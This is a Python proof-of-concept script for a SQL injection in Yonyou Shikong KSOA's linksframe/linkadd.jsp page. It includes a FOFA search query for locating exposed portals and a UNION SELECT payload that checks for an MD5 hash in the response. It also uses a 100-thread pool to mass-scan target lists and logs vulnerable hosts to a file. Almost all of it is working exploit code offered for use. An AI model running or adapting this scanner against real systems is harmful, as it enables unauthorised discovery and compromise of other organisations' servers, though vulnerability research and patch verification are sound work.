#用友时空 KSOA linksframe/linkadd.jsp SQL注入

#fofa语法：title="企业信息系统门户"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  _  __ _____  ____          
 | |/ // ____|/ __ \   /\    
 | ' /| (___ | |  | | /  \   
 |  <  \___ \| |  | |/ /\ \  
 | . \ ____) | |__| / ____ \ 
 |_|\_\_____/ \____/_/    \_\
                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友时空 KSOA")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200 and "value=0xe10adc3949ba59abbe56e057f20f883e" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在SQL注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()